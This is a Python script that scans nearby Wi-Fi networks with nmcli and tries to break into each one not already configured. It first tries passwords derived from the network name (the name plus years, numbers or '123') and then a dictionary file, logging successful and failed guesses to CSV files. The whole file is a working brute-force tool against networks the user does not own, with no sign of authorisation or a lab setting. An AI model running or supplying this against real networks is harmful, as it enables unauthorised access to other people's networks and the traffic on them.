#!/usr/bin/env python3

import subprocess
import time
import csv
import os
import re

FAILED_CSV_FILE = 'failed.csv'
SUCCESS_CSV_FILE = 'success.csv'
IGNORE_FILE = 'ignore.txt'


def scan_wifi():
    result = subprocess.run(
            ['nmcli', '-t', 'dev', 'wifi'],
            stdout=subprocess.PIPE
            )
    networks = result.stdout.decode('utf-8').split('\n')

    ssid_signal_pairs = []
    for line in networks:
        if line:
            parts = line.split(':')
            if len(parts) > 12:
                # SSID is the eighth element in the split line (0-indexed)
                ssid = parts[7]
                try:
                    # Signal strength is the twelfth element (0-indexed)
                    signal = int(parts[11])
                    ssid_signal_pairs.append((ssid, signal))
                except ValueError:
                    # If signal strength is not an integer, skip this entry
                    continue

    # Sort networks by signal strength in descending order
    ssid_signal_pairs.sort(key=lambda x: x[1], reverse=True)
    return ssid_signal_pairs


def get_current_connection():
    result = subprocess.run(
            ['nmcli', '-t', 'connection', 'show', '--active'],
            stdout=subprocess.PIPE
            )
    lines = result.stdout.decode('utf-8').split('\n')
    for line in lines:
        parts = line.split(':')
        if len(parts) > 2 and parts[2] == '802-11-wireless':
            return parts[0]  # Return the active WiFi SSID
    return None


def get_existing_connections():
    result = subprocess.run(
            ['nmcli', '-t', 'connection', 'show'],
            stdout=subprocess.PIPE
            )
    lines = result.stdout.decode('utf-8').split('\n')
    existing_ssids = set()
    for line in lines:
        parts = line.split(':')
        if len(parts) > 3 and parts[3] == '802-11-wireless':
            existing_ssids.add(parts[0])  # Add the SSID to the set
    return existing_ssids


def read_ignore_list(file_path):
    ignore_patterns = []
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    ignore_patterns.append(re.compile(line))
    return ignore_patterns


def should_ignore_ssid(ssid, ignore_patterns):
    for pattern in ignore_patterns:
        if pattern.search(ssid):
            return True
    return False


def read_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords


def generate_passwords(ssid):
    # Clean the SSID by removing spaces and non-alphanumeric characters
    clean_ssid = re.sub(r'\W+', '', ssid.lower())
    ssid_upper = clean_ssid.upper()
    years = [str(year) for year in range(2010, 2025)]
    ranges = [str(num) for num in range(10, 25)]
    passwords = [
        clean_ssid,
        ssid_upper,
        *(clean_ssid + year for year in years),
        *(clean_ssid + num for num in ranges),
        clean_ssid + '123'
    ]

    # Filter out passwords that are less than 8 characters long
    passwords = [pwd for pwd in passwords if len(pwd) >= 8]

    return passwords


def try_connect(ssid, password):
    connect_command = [
            'nmcli',
            'dev',
            'wifi',
            'connect',
            ssid,
            'password',
            password
            ]
    result = subprocess.run(
            connect_command, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
            )
    return result.returncode == 0


def del_connection(ssid):
    delete_command = [
            'nmcli',
            'connection',
            'delete',
            ssid
            ]
    subprocess.run(
            delete_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
            )
    return


def initialize_csv(file_path, header):
    if not os.path.exists(file_path):
        with open(file_path, 'w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(header)


def read_failed_attempts(file_path):
    failed_attempts = set()
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            reader = csv.reader(file)
            next(reader, None)  # Skip the header
            for row in reader:
                if len(row) == 2:
                    failed_attempts.add((row[0], row[1]))
    return failed_attempts


def log_failed_attempt(ssid, password, file_path):
    with open(file_path, 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([ssid, password])


def log_success(ssid, password, file_path):
    with open(file_path, 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([ssid, password])


def main():
    # Initialize the CSV files if they do not exist
    initialize_csv(FAILED_CSV_FILE, ['SSID', 'Password'])
    initialize_csv(SUCCESS_CSV_FILE, ['SSID', 'Password'])

    ignore_patterns = read_ignore_list(IGNORE_FILE)
    ssid_signal_pairs = scan_wifi()
    current_ssid = get_current_connection()
    existing_ssids = get_existing_connections()
    passwords = read_passwords('passwords.txt')
    failed_attempts = read_failed_attempts(FAILED_CSV_FILE)

    for ssid, signal in ssid_signal_pairs:
        if ssid == current_ssid or ssid in existing_ssids or should_ignore_ssid(ssid, ignore_patterns):
            print(f'Skipping network: {ssid} (already connected, configured, or ignored)')
            continue

        print(f'Trying to connect to {ssid} with signal strength {signal}')

        # Generate passwords based on SSID and try them
        generated_passwords = generate_passwords(ssid)
        for password in generated_passwords:
            if (ssid, password) in failed_attempts:
                print(f'Skipping previously failed combination: {ssid} / {password}')
                continue

            if try_connect(ssid, password):
                print(f'Successfully connected to {ssid} with generated password: {password}')
                log_success(ssid, password, SUCCESS_CSV_FILE)
                return
            else:
                print(f'Failed to connect to {ssid} with generated password: {password}')
                log_failed_attempt(ssid, password, FAILED_CSV_FILE)
                del_connection(ssid)

        # Try passwords from the dictionary
        for password in passwords:
            if (ssid, password) in failed_attempts:
                print(f'Skipping previously failed combination: {ssid} / {password}')
                continue

            if try_connect(ssid, password):
                print(f'Successfully connected to {ssid} with password: {password}')
                log_success(ssid, password, SUCCESS_CSV_FILE)
                return
            else:
                print(f'Failed to connect to {ssid} with password: {password}')
                log_failed_attempt(ssid, password, FAILED_CSV_FILE)
                del_connection(ssid)
                time.sleep(1)  # Optional: wait a bit before the next attempt

    print('Failed to connect to any network with provided passwords.')


if __name__ == '__main__':
    main()
